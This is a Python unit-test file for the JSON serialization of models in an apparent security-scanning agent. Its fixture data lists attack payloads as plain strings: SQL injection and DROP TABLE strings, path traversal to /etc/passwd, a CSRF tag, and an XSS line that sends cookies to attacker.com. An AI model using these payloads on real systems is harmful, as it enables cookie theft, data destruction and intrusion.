import json
from src.target_scan_agent.state.state import (
    Target,
    TargetScanToolResult,
    TargetScanOutput,
)


class TestStateModels:
    """Unit tests for state models JSON serialization."""

    def test_target_serialization_basic(self):
        """Test basic serialization of Target model."""
        target = Target(
            description="Test web application for security assessment",
            url="https://example.com",
        )

        # Test to_json() method
        json_str = target.to_json()
        assert isinstance(json_str, str)

        # Test to_dict() method
        dict_result = target.to_dict()
        assert isinstance(dict_result, dict)
        assert (
            dict_result["description"] == "Test web application for security assessment"
        )
        assert dict_result["url"] == "https://example.com"

        # Test standard json.dumps() with to_dict()
        json_dumps_result = json.dumps(target.to_dict())
        assert isinstance(json_dumps_result, str)

    def test_target_round_trip_serialization(self):
        """Test round-trip serialization (serialize -> deserialize)."""
        original = Target(
            description="E-commerce platform with user authentication",
            url="https://shop.example.com",
        )

        # Serialize to JSON
        json_str = original.to_json()

        # Deserialize back
        loaded_dict = json.loads(json_str)
        reconstructed = Target.model_validate(loaded_dict)

        # Verify they match
        assert reconstructed.description == original.description
        assert reconstructed.url == original.url

    def test_target_scan_serialization_full(self):
        """Test serialization of TargetScan with all fields."""
        target_scan = TargetScanToolResult(
            name="Directory Enumeration Finding",
            severity="medium",
            description="Found sensitive directories accessible without authentication",
            possible_attacks=[
                "curl https://example.com/admin/ - Access admin panel",
                "curl https://example.com/.env - Read environment variables",
                "curl https://example.com/config/ - Access configuration files",
            ],
        )

        # Test to_json() method
        json_str = target_scan.to_json()
        assert isinstance(json_str, str)

        # Test to_dict() method
        dict_result = target_scan.to_dict()
        assert isinstance(dict_result, dict)
        assert dict_result["name"] == "Directory Enumeration Finding"
        assert dict_result["severity"] == "medium"
        assert (
            dict_result["description"]
            == "Found sensitive directories accessible without authentication"
        )
        assert len(dict_result["possible_attacks"]) == 3
        assert "curl https://example.com/admin/" in dict_result["possible_attacks"][0]

    def test_target_scan_serialization_partial(self):
        """Test serialization of TargetScan with some None fields."""
        target_scan = TargetScanToolResult(
            name="Basic Security Check",
            severity=None,
            description="Performed basic security assessment",
            possible_attacks=None,
        )

        # Test serialization
        json_str = target_scan.to_json()
        dict_result = target_scan.to_dict()

        assert dict_result["name"] == "Basic Security Check"
        assert dict_result["severity"] is None
        assert dict_result["description"] == "Performed basic security assessment"
        assert dict_result["possible_attacks"] is None

        # Test standard json.dumps() with to_dict()
        json_dumps_result = json.dumps(target_scan.to_dict())
        assert isinstance(json_dumps_result, str)

    def test_target_scan_serialization_empty(self):
        """Test serialization of TargetScan with all fields None."""
        target_scan = TargetScanToolResult()

        # Test serialization
        json_str = target_scan.to_json()
        dict_result = target_scan.to_dict()

        assert dict_result["name"] is None
        assert dict_result["severity"] is None
        assert dict_result["description"] is None
        assert dict_result["possible_attacks"] is None

    def test_target_scan_round_trip_serialization(self):
        """Test round-trip serialization of TargetScan."""
        original = TargetScanToolResult(
            name="Vulnerability Assessment",
            severity="high",
            description="Critical security vulnerabilities found",
            possible_attacks=[
                "SQL Injection: ' OR 1=1 --",
                "XSS: <script>alert('xss')</script>",
            ],
        )

        # Serialize to JSON
        json_str = original.to_json()

        # Deserialize back
        loaded_dict = json.loads(json_str)
        reconstructed = TargetScanToolResult.model_validate(loaded_dict)

        # Verify they match
        assert reconstructed.name == original.name
        assert reconstructed.severity == original.severity
        assert reconstructed.description == original.description
        assert reconstructed.possible_attacks == original.possible_attacks

    def test_target_scan_output_serialization(self):
        """Test serialization of TargetScanOutput."""
        output = TargetScanOutput(
            summary="Security assessment completed successfully. Found 3 high-risk vulnerabilities and 7 medium-risk issues."
        )

        # Test to_json() method
        json_str = output.to_json()
        assert isinstance(json_str, str)

        # Test to_dict() method
        dict_result = output.to_dict()
        assert isinstance(dict_result, dict)
        assert "Security assessment completed" in dict_result["summary"]

        # Test standard json.dumps() with to_dict()
        json_dumps_result = json.dumps(output.to_dict())
        assert isinstance(json_dumps_result, str)

    def test_target_scan_output_serialization_none(self):
        """Test serialization of TargetScanOutput with None summary."""
        output = TargetScanOutput()

        # Test serialization
        json_str = output.to_json()
        dict_result = output.to_dict()

        assert dict_result["summary"] is None

    def test_target_scan_output_round_trip_serialization(self):
        """Test round-trip serialization of TargetScanOutput."""
        original = TargetScanOutput(
            summary="Comprehensive security scan completed. Target appears secure with minor configuration issues."
        )

        # Serialize to JSON
        json_str = original.to_json()

        # Deserialize back
        loaded_dict = json.loads(json_str)
        reconstructed = TargetScanOutput.model_validate(loaded_dict)

        # Verify they match
        assert reconstructed.summary == original.summary

    def test_json_dumps_compatibility_all_models(self):
        """Test that all models work with standard json.dumps()."""
        # Test Target
        target = Target(description="Test target", url="https://test.example.com")
        json_output = json.dumps(target.to_dict())
        assert isinstance(json_output, str)
        loaded = json.loads(json_output)
        assert loaded["url"] == "https://test.example.com"

        # Test TargetScan
        scan = TargetScanToolResult(
            name="Test Scan",
            severity="low",
            description="Test scan description",
            possible_attacks=["test attack"],
        )
        json_output = json.dumps(scan.to_dict())
        assert isinstance(json_output, str)
        loaded = json.loads(json_output)
        assert loaded["name"] == "Test Scan"

        # Test TargetScanOutput
        output = TargetScanOutput(summary="Test summary")
        json_output = json.dumps(output.to_dict())
        assert isinstance(json_output, str)
        loaded = json.loads(json_output)
        assert loaded["summary"] == "Test summary"

    def test_complex_target_scan_scenario(self):
        """Test serialization of complex TargetScan scenario."""
        target_scan = TargetScanToolResult(
            name="Comprehensive Web Application Security Assessment",
            severity="critical",
            description="Multiple critical vulnerabilities found including SQL injection, XSS, and directory traversal. Immediate remediation required.",
            possible_attacks=[
                "SQL Injection - Admin bypass: admin' OR '1'='1' --",
                "XSS - Cookie theft: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
                "Directory Traversal - System file access: curl https://example.com/download?file=../../../etc/passwd",
                "CSRF - Unauthorized actions: <img src='https://example.com/transfer?amount=1000&to=attacker'>",
                "File Upload - Malicious script: Upload PHP shell via image upload functionality",
            ],
        )

        # Test serialization handles complex data
        json_str = target_scan.to_json()
        dict_result = target_scan.to_dict()

        # Verify all data is preserved
        assert dict_result["severity"] == "critical"
        assert len(dict_result["possible_attacks"]) == 5
        assert "SQL Injection" in dict_result["possible_attacks"][0]
        assert "XSS" in dict_result["possible_attacks"][1]
        assert "Directory Traversal" in dict_result["possible_attacks"][2]

        # Test round-trip with complex data
        loaded_dict = json.loads(json_str)
        reconstructed = TargetScanToolResult.model_validate(loaded_dict)

        assert reconstructed.severity == "critical"
        assert len(reconstructed.possible_attacks) == 5
        assert reconstructed.possible_attacks == target_scan.possible_attacks

    def test_special_characters_serialization(self):
        """Test serialization handles special characters correctly."""
        target = Target(
            description="Test with special chars: üñíçødé & symbols <>&\"'",
            url="https://example.com/path?param=value&other=test",
        )

        scan = TargetScanToolResult(
            name="Special Characters Test: 测试 & émojis 🔒",
            description="Description with quotes: \"double\" & 'single' & <tags>",
            possible_attacks=[
                "Attack with special chars: '; DROP TABLE users; --",
                "Unicode attack: ../../../../etc/passwd%00.jpg",
            ],
        )

        # Test Target serialization
        target_json = target.to_json()
        target_dict = json.loads(target_json)
        reconstructed_target = Target.model_validate(target_dict)
        assert reconstructed_target.description == target.description
        assert reconstructed_target.url == target.url

        # Test TargetScan serialization
        scan_json = scan.to_json()
        scan_dict = json.loads(scan_json)
        reconstructed_scan = TargetScanToolResult.model_validate(scan_dict)
        assert reconstructed_scan.name == scan.name
        assert reconstructed_scan.description == scan.description
        assert reconstructed_scan.possible_attacks == scan.possible_attacks
